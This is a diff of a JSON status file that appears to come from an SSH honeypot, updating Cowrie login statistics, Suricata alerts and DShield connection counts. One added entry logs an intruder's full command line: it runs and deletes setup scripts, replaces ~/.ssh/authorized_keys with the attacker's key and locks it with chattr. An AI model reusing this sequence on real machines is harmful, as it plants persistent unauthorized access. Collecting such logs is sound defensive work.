@@ -1,11 +1,11 @@
 {
-  "last_updated": "2026-05-21T12:05:01.548814+00:00",
-  "last_updated_local": "2026-05-21 05:05:01 PDT",
+  "last_updated": "2026-05-21T12:10:02.068974+00:00",
+  "last_updated_local": "2026-05-21 05:10:02 PDT",
   "cowrie": {
-    "total_connections": 78,
-    "total_login_attempts": 59,
-    "successful_logins": 4,
-    "unique_ips": 15,
+    "total_connections": 80,
+    "total_login_attempts": 61,
+    "successful_logins": 6,
+    "unique_ips": 16,
     "top_usernames": [
       [
         "solv",
@@ -22,6 +22,10 @@
       [
         "ubuntu",
         7
+      ],
+      [
+        "root",
+        3
       ],
       [
         "admin",
@@ -41,10 +45,6 @@
       ],
       [
         "banxgg",
-        1
-      ],
-      [
-        "orangepi",
         1
       ]
     ],
@@ -100,15 +100,15 @@
         14
       ],
       [
+        "152.32.132.28",
+        4
+      ],
+      [
         "45.148.10.121",
         3
       ],
       [
         "87.251.64.149",
-        3
-      ],
-      [
-        "152.32.132.28",
         3
       ],
       [
@@ -168,23 +168,18 @@
         "commands": [
           "/bin/./uname -s -v -n -r -m"
         ]
+      },
+      {
+        "ip": "130.12.180.51",
+        "username": "root",
+        "password": "password",
+        "time": "05:05:31",
+        "commands": [
+          "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; "
+        ]
       }
     ],
     "recent_attempts": [
-      {
-        "time": "02:51:52",
-        "ip": "80.94.92.184",
-        "username": "solana",
-        "password": "solana",
-        "success": false
-      },
-      {
-        "time": "02:54:37",
-        "ip": "80.94.92.184",
-        "username": "sol",
-        "password": "sol",
-        "success": false
-      },
       {
         "time": "02:57:33",
         "ip": "80.94.92.184",
@@ -310,14 +305,28 @@
         "username": "root",
         "password": "P",
         "success": false
+      },
+      {
+        "time": "05:05:30",
+        "ip": "152.32.132.28",
+        "username": "root",
+        "password": "password",
+        "success": true
+      },
+      {
+        "time": "05:05:31",
+        "ip": "130.12.180.51",
+        "username": "root",
+        "password": "password",
+        "success": true
       }
     ]
   },
   "suricata": {
-    "total_alerts": 473,
+    "total_alerts": 475,
     "alerts_by_severity": {
-      "2": 356,
-      "3": 117
+      "2": 357,
+      "3": 118
     },
     "top_signatures": [
       [
@@ -326,7 +335,7 @@
       ],
       [
         "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        100
+        101
       ],
       [
         "ET COMPROMISED Known Compromised or Hostile Host Traffic group 14",
@@ -404,20 +413,6 @@
       ]
     ],
     "recent_alerts": [
-      {
-        "time": "03:32:07",
-        "severity": 2,
-        "signature": "ET DROP Dshield Block Listed Source group 1",
-        "src_ip": "66.132.172.16",
-        "dest_port": 22
-      },
-      {
-        "time": "03:34:49",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "80.94.92.184",
-        "dest_port": 22
-      },
       {
         "time": "03:37:42",
         "severity": 3,
@@ -543,12 +538,26 @@
         "signature": "ET COMPROMISED Known Compromised or Hostile Host Traffic group 3",
         "src_ip": "152.32.132.28",
         "dest_port": 22
+      },
+      {
+        "time": "05:05:31",
+        "severity": 2,
+        "signature": "ET DROP Spamhaus DROP Listed Traffic Inbound group 26",
+        "src_ip": "130.12.180.51",
+        "dest_port": 22
+      },
+      {
+        "time": "05:05:31",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "130.12.180.51",
+        "dest_port": 22
       }
     ]
   },
   "dshield": {
-    "total_connections": 174,
-    "unique_ips": 80,
+    "total_connections": 177,
+    "unique_ips": 82,
     "top_src_ips": [
       [
         "80.94.92.184",
@@ -567,11 +576,11 @@
         6
       ],
       [
-        "46.151.178.13",
-        4
+        "152.32.132.28",
+        5
       ],
       [
-        "152.32.132.28",
+        "46.151.178.13",
         4
       ],
       [
@@ -594,11 +603,11 @@
     "top_dest_ports": [
       [
         "22",
-        97
+        99
       ],
       [
         "8443",
-        46
+        47
       ],
       [
         "8000",
@@ -606,18 +615,6 @@
       ]
     ],
     "recent_connections": [
-      {
-        "src_ip": "45.148.10.67",
-        "dest_port": "8000"
-      },
-      {
-        "src_ip": "45.148.10.67",
-        "dest_port": "8443"
-      },
-      {
-        "src_ip": "5.61.209.33",
-        "dest_port": "8000"
-      },
       {
         "src_ip": "223.244.100.235",
         "dest_port": "8443"
@@ -685,6 +682,18 @@
       {
         "src_ip": "152.32.132.28",
         "dest_port": "22"
+      },
+      {
+        "src_ip": "152.32.132.28",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "130.12.180.51",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "209.141.45.103",
+        "dest_port": "8443"
       }
     ]
   }
